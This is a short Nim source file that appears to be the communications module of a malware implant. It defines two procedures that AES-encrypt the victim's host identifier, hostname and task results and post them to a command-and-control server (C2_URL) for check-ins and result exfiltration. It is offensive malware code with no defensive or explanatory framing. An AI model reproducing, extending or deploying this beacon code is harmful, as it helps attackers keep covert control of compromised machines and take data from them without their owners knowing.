import httpclient, json, strformat
import config, crypto

let client = newHttpClient()

proc sendCheckin*(id: string): string =
  let payload = %*{
    "id": id,
    "hostname": getHostname()
  }
  let enc = encrypt($payload, AES_KEY)
  return client.postContent(C2_URL & CHECKIN_URI, enc)

proc sendTaskResult*(id: string, result: string): string =
  let payload = %*{
    "id": id,
    "data": result
  }
  let enc = encrypt($payload, AES_KEY)
  return client.postContent(C2_URL & RESULT_URI, enc)
